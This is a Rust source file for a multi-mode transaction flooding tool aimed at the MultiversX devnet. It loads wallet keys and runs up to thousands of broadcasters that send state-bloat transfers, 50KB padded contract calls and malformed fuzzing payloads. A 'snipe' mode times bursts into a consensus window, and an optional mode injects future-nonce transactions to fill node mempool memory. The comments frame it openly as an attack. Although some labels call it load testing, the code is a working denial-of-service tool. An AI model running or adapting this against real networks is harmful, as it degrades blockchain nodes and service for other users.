mod wallet;
mod transaction;
mod network;
mod tui;

use wallet::KeeperWallet;
use transaction::Transaction;
use network::MultiversXNetwork;
use tui::{run_dashboard, AppStats};

use std::sync::{Arc, atomic::{AtomicU64, Ordering}};
use std::time::Duration;
use tokio::time::sleep;
use tokio::sync::mpsc;
use rand::Rng;
use clap::{Parser, ValueEnum};

#[derive(Parser, Debug)]
#[command(author, version, about = "XCron Keeper Protocol Multi-Role Node", long_about = None)]
pub struct Cli {
    /// The attack or operation mode to execute
    #[arg(short, long, value_enum)]
    pub mode: AttackMode,

    /// Number of concurrent background broadcasters (HTTP Network Threads)
    #[arg(long, default_value_t = 2000)]
    pub broadcasters: usize,

    /// Target kill zone start in ms for Snipe mode
    #[arg(long, default_value_t = 40)]
    pub kill_zone_start_ms: u64,

    /// Target kill zone end in ms for Snipe mode
    #[arg(long, default_value_t = 47)]
    pub kill_zone_end_ms: u64,

    /// Total Supernova cycle duration in ms for Snipe mode
    #[arg(long, default_value_t = 600)]
    pub cycle_duration_ms: u64,

    /// Target TPS per worker for PreWarm mode
    #[arg(long, default_value_t = 100)]
    pub tps: u32,
    
    /// Target Contract Address (Bech32) to schedule against
    #[arg(long, default_value = "erd1qqqqqqqqqqqqqpgqjq6g52c9dxy7vtckspndqxhqmm0mmken7k8sahvvd5")]
    pub target_contract: String,

    /// Max number of wallets to use (0 = all)
    #[arg(long, default_value_t = 0)]
    pub wallets: usize,

    /// Mixed attack mode: injects +5 nonce gaps (RAM poisoning) alongside valid TPS
    #[arg(long, default_value_t = false)]
    pub mixed_attack: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, ValueEnum)]
pub enum AttackMode {
    /// Maniobra A: Inundar con carga pre-calculada para quemar RAM poco a poco.
    PreWarm,
    /// Maniobra B: Micro-Bursting de silencio absoluto y ráfagas letales en la ventana PBFT.
    Snipe,
    /// The Devnet Load Tester: floods network with valid scheduleTask payloads
    Stress,
    /// Round-Robin Keeper competition mode
    MultiKeeper,
    /// Protocol Integrity: Mandar payloads y firmas deformadas a la red
    Fuzz,
}

fn generate_schedule_payload() -> Vec<u8> {
    let target_addr_hex = "00000000000000000500ebaa4de200cf54fe97a0604c759cd8f6de251daeb90b";
    let endpoint_hex = hex::encode("ping");
    let trigger_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() + 30;
    let trigger_hex = format!("00{:016x}", trigger_time);
    let task_id_hex = format!("{:016x}", 40_000_000);
    let retries_hex = "02";
    let ttl_hex = format!("{:016x}", 604800);
    // 50KB State Bloat Padding
    let padding_50kb = "00".repeat(25_000);
    let data_str = format!("scheduleTask@{target_addr_hex}@{endpoint_hex}@00000000@{trigger_hex}@{task_id_hex}@{retries_hex}@{ttl_hex}@{padding_50kb}");
    data_str.into_bytes()
}

/// Lightweight valid EGLD transfer - costs only 50,000 gas, no payload
/// Used in MIX mode for the 70% valid traffic pattern
fn generate_lightweight_payload() -> Option<Vec<u8>> {
    // Simple ping call with no bloat - legitimate network activity
    Some(b"ping".to_vec())
}

fn generate_fuzzing_payload() -> Vec<u8> {
    // Malformed cross-shard triggers for protocol integrity testing
    let variant: u8 = rand::random::<u8>() % 4;
    match variant {
        0 => b"executeTask@FFFFFFFFFFFFFFFFFFFF".to_vec(),
        1 => b"scheduleTask@0000000000000000000000000000000000000000000000000000000000000000@@@@@".to_vec(),
        2 => format!("scheduleTask@{}", "FF".repeat(500)).into_bytes(), // Oversized args
        _ => b"\x00\x01\x02\x03\xff\xfe\xfd".to_vec(), // Raw binary garbage
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();
    
    println!("🔥 XCron Protocol Multi-Role Node Starting...");
    println!("⚔️  Mode Selected: {:?}", cli.mode);
    println!("⚙️  Broadcasters: {}", cli.broadcasters);

    let network = Arc::new(MultiversXNetwork::new("https://devnet-api.multiversx.com"));
    let stats = Arc::new(AppStats::new());
    
    // 1. Load the Cryptographic Arsenal
    let mut wallets = Vec::new();
    // Fallback logic for wallet paths during development if hydra-keys is missing
    let actual_path = if std::path::Path::new("./.secrets/hydra-keys.json").exists() {
        "./.secrets/hydra-keys.json"
    } else if std::path::Path::new("../.secrets/hydra-keys.json").exists() {
        "../.secrets/hydra-keys.json"
    } else if std::path::Path::new("./.secrets/deployer.pem").exists() {
        "./.secrets/deployer.pem"
    } else {
        "../.secrets/deployer.pem"
    };

    if actual_path.ends_with(".pem") {
        if let Ok(w) = KeeperWallet::load_pem(actual_path) {
            println!("Loaded 1 PEM wallet from {}", actual_path);
            wallets.push(Arc::new(w));
        } else {
            return Err(format!("Failed to load wallet from {}", actual_path).into());
        }
    } else {
        match KeeperWallet::load_hydra_json(actual_path) {
            Ok(loaded) => {
                println!("Loaded {} Hydra wallets from JSON.", loaded.len());
                for w in loaded {
                    wallets.push(Arc::new(w));
                }
            },
            Err(e) => {
                eprintln!("Failed to load hydra JSON from {}: {}", actual_path, e);
                return Err(e.into());
            }
        }
    }
    
    if wallets.is_empty() {
        return Err("No wallets found. Cannot attack without weapons.".into());
    }

    // Limit wallets if --wallets flag is set
    if cli.wallets > 0 && cli.wallets < wallets.len() {
        wallets.truncate(cli.wallets);
        println!("🎯 Using {} wallets (limited by --wallets flag)", wallets.len());
    }

    // 2. Setup Nonces — fetch real nonces for ALL active wallets
    let mut shared_nonces = Vec::with_capacity(wallets.len());
    println!("📡 Fetching real nonces for {} wallets...", wallets.len());
    for (i, wallet) in wallets.iter().enumerate() {
        let initial_nonce = match network.fetch_nonce(&wallet.bech32_address).await {
            Ok(n) => {
                if i < 5 { println!("  [{}] {} → nonce={}", i, &wallet.bech32_address[..20], n); }
                n
            },
            Err(e) => {
                if i < 5 { println!("  [{}] {} → FAIL: {}", i, &wallet.bech32_address[..20], e); }
                0
            },
        };
        shared_nonces.push(Arc::new(AtomicU64::new(initial_nonce)));
        // Rate limit: 20ms between requests to avoid API throttling
        if i % 50 == 49 {
            println!("   ...{}/{} nonces fetched", i + 1, wallets.len());
            sleep(Duration::from_millis(100)).await;
        }
    }
    println!("✅ All {} nonces loaded. Ready to fire.", wallets.len());

    let num_wallets = wallets.len() as u64;
    stats.active_workers.store(num_wallets, Ordering::Relaxed);

    // 3. UI Dashboard Thread (DISABLED FOR HEADLESS SERVER)
    // let dashboard_stats = Arc::clone(&stats);
    // let ui_handle = tokio::spawn(async move {
    //     run_dashboard(dashboard_stats).await.unwrap_or(());
    // });


    // 3.5. Web Dashboard Thread (Sauron's Eye Remote)
    let web_stats = Arc::clone(&stats);
    tokio::spawn(async move {
        use tokio::net::TcpListener;
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        
        if let Ok(listener) = TcpListener::bind("0.0.0.0:8080").await {
            loop {
                if let Ok((mut socket, _)) = listener.accept().await {
                    let stats_clone = Arc::clone(&web_stats);
                    tokio::spawn(async move {
                        let mut buf = [0; 1024];
                        if let Ok(n) = socket.read(&mut buf).await {
                            if n == 0 { return; }
                            let request = String::from_utf8_lossy(&buf[..n]);
                            
                            if request.starts_with("GET /metrics") {
                                let sent = stats_clone.total_tx_sent.load(Ordering::Relaxed);
                                let errs = stats_clone.total_errors.load(Ordering::Relaxed);
                                let response = format!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\n\r\n{{\"sent\": {}, \"errors\": {}}}", sent, errs);
                                let _ = socket.write_all(response.as_bytes()).await;
                            } else {
                                let html = include_str!("dashboard.html");
                                let response = format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{}", html);
                                let _ = socket.write_all(response.as_bytes()).await;
                            }
                        }
                    });
                }
            }
        }
    });

    // =========================================================================
    // THE KITCHEN ARCHITECTURE (MPSC channels)
    // =========================================================================
    let (tx_sender, tx_receiver) = mpsc::channel::<Transaction>(50_000);

    // --- CONSUMERS (The Kitchen) ---
    let mut handles = vec![];
    let rx_shared = Arc::new(tokio::sync::Mutex::new(tx_receiver));

    for _ in 0..cli.broadcasters {
        let rx_clone = Arc::clone(&rx_shared);
        let net_clone = Arc::clone(&network);
        let stats_clone = Arc::clone(&stats);

        let handle = tokio::spawn(async move {
            let mut backoff_ms: u64 = 10;
            loop {
                let transaction = {
                    let mut rx = rx_clone.lock().await;
                    match rx.recv().await {
                        Some(tx) => tx,
                        None => break,
                    }
                };

                // Retry with exponential backoff (max 3 attempts)
                let mut attempts = 0;
                let mut succeeded = false;
                while attempts < 3 && !succeeded {
                    attempts += 1;
                    // Consume the Result fully BEFORE any .await to satisfy Send
                    let was_ok = match net_clone.broadcast_tx(&transaction).await {
                        Ok(hash) => {
                            stats_clone.total_tx_sent.fetch_add(1, Ordering::Relaxed);
                            backoff_ms = 10;
                            let sent = stats_clone.total_tx_sent.load(Ordering::Relaxed);
                            if sent % 100 == 0 {
                                println!("🚀 [{} txs sent] Latest: {}", sent, hash);
                            }
                            true
                        },
                        Err(_e) => {
                            stats_clone.total_errors.fetch_add(1, Ordering::Relaxed);
                            false
                        }
                    };
                    // Result is now dropped — safe to .await
                    if was_ok {
                        succeeded = true;
                    } else {
                        sleep(Duration::from_millis(backoff_ms)).await;
                        backoff_ms = (backoff_ms * 2).min(1000);
                    }
                }
            }
        });
        handles.push(handle);
    }

    // --- PRODUCERS (The Waiters taking orders) ---
    for i in 0..wallets.len() {
        let wallet_clone = Arc::clone(&wallets[i]);
        let nonce_clone = Arc::clone(&shared_nonces[i]);
        let tx_sender_clone = tx_sender.clone();
        let mode_clone = cli.mode.clone();
        let kz_start = cli.kill_zone_start_ms;
        let kz_end = cli.kill_zone_end_ms;
        let cycle = cli.cycle_duration_ms;
        let cli_tps = cli.tps;
        let mixed_attack = cli.mixed_attack;
        
        let handle = tokio::spawn(async move {
            let mut burst_start = tokio::time::Instant::now();

            loop {
                match mode_clone {
                    AttackMode::PreWarm | AttackMode::Stress | AttackMode::MultiKeeper | AttackMode::Fuzz => {
                        // All these modes fire continuously, bounded by TPS
                        let delay = Duration::from_micros(1_000_000 / cli_tps as u64);
                        sleep(delay).await;
                    },
                    AttackMode::Snipe => {
                        let elapsed = burst_start.elapsed().as_millis() as u64;
                        if elapsed < kz_start {
                            // Wait until the kill zone opens (e.g., ms 40)
                            sleep(Duration::from_millis(kz_start - elapsed)).await;
                            continue;
                        } else if elapsed > kz_end {
                            // Kill zone closed. Wait until the end of the 600ms cycle
                            if elapsed < cycle {
                                sleep(Duration::from_millis(cycle - elapsed)).await;
                            }
                            burst_start = tokio::time::Instant::now();
                            continue;
                        }
                        // INSIDE THE KILL ZONE (ms 40 - 47) - ZERO DELAY
                    }
                }

                let current_nonce = nonce_clone.fetch_add(1, Ordering::SeqCst);
                
                // Determine Payload and Gas logic
                // MIX strategy: 95% lightweight valid txs + 5% heavy fuzzing
                let roll: u8 = rand::random::<u8>() % 100;
                
                let (payload, gas, receiver_owned, value) = match mode_clone {
                    AttackMode::Stress => {
                        if roll < 95 {
                            // 95%: STATE BLOAT TRANSFER (cheap, expands DB RAM)
                            (None, 50_000, KeeperWallet::generate_random_address(), "1")
                        } else {
                            // 5%: Heavy schedule payload with 50KB bloat
                            let pl = generate_schedule_payload();
                            (Some(pl), 600_000_000, "erd1qqqqqqqqqqqqqpgqjq6g52c9dxy7vtckspndqxhqmm0mmken7k8sahvvd5".to_string(), "0")
                        }
                    },
                    AttackMode::Fuzz => {
                        // Protocol Integrity: varied malformed payloads
                        let pl = generate_fuzzing_payload();
                        (Some(pl), 600_000_000, "erd1qqqqqqqqqqqqqpgqjq6g52c9dxy7vtckspndqxhqmm0mmken7k8sahvvd5".to_string(), "0")
                    },
                    _ => {
                        // PreWarm/Snipe/MultiKeeper: PURE STATE BLOAT to random uncharted accounts
                        (None, 50_000, KeeperWallet::generate_random_address(), "1")
                    }
                };

                let mut tx = Transaction::new(
                    current_nonce,
                    value,
                    &receiver_owned,
                    &wallet_clone.bech32_address,
                    1_000_000_000,
                    gas,
                    payload.as_deref(),
                    "D", // Devnet by default
                    1
                );
                
                // Arm the Missile
                if mixed_attack && roll < 30 {
                    // 30% chance to send a RAM-Poisoning future-nonce transaction (+5 gap)
                    // This will sit in the mempool RAM waiting for the missing 4 nonces
                    let mut poison_tx = Transaction::new(
                        current_nonce + 5,
                        value,
                        &receiver_owned,
                        &wallet_clone.bech32_address,
                        1_000_000_000,
                        gas,
                        payload.as_deref(),
                        "D",
                        1
                    );
                    if poison_tx.sign(&wallet_clone.signing_key).is_ok() {
                        let _ = tx_sender_clone.send(poison_tx).await;
                    }
                }

                if tx.sign(&wallet_clone.signing_key).is_ok() {
                    if tx_sender_clone.send(tx).await.is_err() {
                        break; 
                    }
                }
            }
        });
        handles.push(handle);
    }

    drop(tx_sender);
    // Block main thread to keep tasks alive
    futures::future::join_all(handles).await;
    
    Ok(())
}
